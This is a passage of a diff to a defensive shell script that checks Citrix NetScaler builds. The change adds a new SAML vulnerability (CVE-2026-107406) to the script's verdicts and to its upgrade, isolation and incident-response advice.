-    [ "$VULN9" -eq 1 ] && echo "SAML is configured: install $FIX9 or later - it also fixes CVE-2026-88779 (CTX697174)."
+    { [ "$VULN9" -eq 1 ] || [ "$VULN10" -eq 1 ]; } && echo "SAML is configured: install ${FIX10:-$FIX9} or later - it also fixes CVE-2026-88779 (CTX697174) and CVE-2026-107406 (CTX697191)."
     [ "$ISN_OPEN" -eq 1 ] && echo "After the upgrade, also enable Enhanced ISN: CVE-2026-88778 needs that config change."
     echo "Assume breach on internet-facing appliances: preserve evidence, upgrade, then hunt."
     echo "Official IoC scan: NetScaler Console > Security Advisory, or via Citrix Support."
@@ -2542,13 +2619,24 @@ case "$VULN_BUILD" in
     if [ -n "$COMP" ]; then
       printf '%sVERDICT: COMPROMISED - follow CTX694799.%s The build is fixed, but the compromise indicators above show an attacker ran commands.\n' "$R$B" "$N"
       echo "Do NOT reboot yet: copy this report and /var/log off the box, isolate it, collect 'show techsupport', then rebuild and rotate ALL keys, certificates and passwords."
-      [ "$VULN9" -eq 1 ] && echo "SAML is also still vulnerable to CVE-2026-88779 on this build - the rebuild must use $FIX9 or later."
+      if [ "$VULN10" -eq 1 ] && [ "$VULN9" -eq 1 ]; then echo "SAML is also still vulnerable to CVE-2026-88779 and CVE-2026-107406 on this build - the rebuild must use $FIX10 or later."
+      elif [ "$VULN10" -eq 1 ]; then echo "SAML is also still vulnerable to CVE-2026-107406 (remote code execution) on this build - the rebuild must use $FIX10 or later."
+      elif [ "$VULN9" -eq 1 ]; then echo "SAML is also still vulnerable to CVE-2026-88779 on this build - the rebuild must use ${FIX10:-$FIX9} or later."; fi
       [ "$ISN_OPEN" -eq 1 ] && echo "Also enable Enhanced ISN: CVE-2026-88778 needs that config change."
+      exit 2
+    fi
+    # v1.16: CTX697096 fixed, but SAML configured on a build without the CVE-2026-107406 fix (CTX697191, RCE 9.5)
+    if [ "$VULN10" -eq 1 ]; then
+      if [ "$VULN9" -eq 1 ]; then _v="CVE-2026-107406 and CVE-2026-88779"; _f="The CTX697096 fixes are in place."; else _v="CVE-2026-107406"; _f="The CTX697096 and CVE-2026-88779 fixes are in place."; fi
+      printf '%sVERDICT: VULNERABLE to %s (SAML) - upgrade to %s or later.%s %s\n' "$R$B" "$_v" "$FIX10" "$N" "$_f"
+      echo "CVE-2026-107406 (CTX697191, 8 Oct) is critical (9.5): a SAML memory overflow that can lead to remote code execution. The bulletin lists no workaround."
+      [ "$ISN_OPEN" -eq 1 ] && echo "Also enable Enhanced ISN: CVE-2026-88778 needs that config change."
+      [ "$FOLLOWUP" -eq 1 ] && echo "Also review the other follow-up items above."
       exit 2
     fi
     # v1.12: CTX697096 fixed, but SAML configured on a build without the CVE-2026-88779 fix
     if [ "$VULN9" -eq 1 ]; then
-      printf '%sVERDICT: VULNERABLE to CVE-2026-88779 (SAML) - upgrade to %s or later.%s The CTX697096 fixes are in place.\n' "$R$B" "$FIX9" "$N"
+      printf '%sVERDICT: VULNERABLE to CVE-2026-88779 (SAML) - upgrade to %s or later.%s The CTX697096 fixes are in place.\n' "$R$B" "${FIX10:-$FIX9}" "$N"
       echo "Citrix observes targeted attacks causing denial of service; CISA lists it as exploited (KEV, 4 Oct). Until you upgrade: Global Deny List signatures or Citrix Support's responder policy."
       [ "$ISN_OPEN" -eq 1 ] && echo "Also enable Enhanced ISN: CVE-2026-88778 needs that config change."
       [ "$FOLLOWUP" -eq 1 ] && echo "Also review the other follow-up items above."
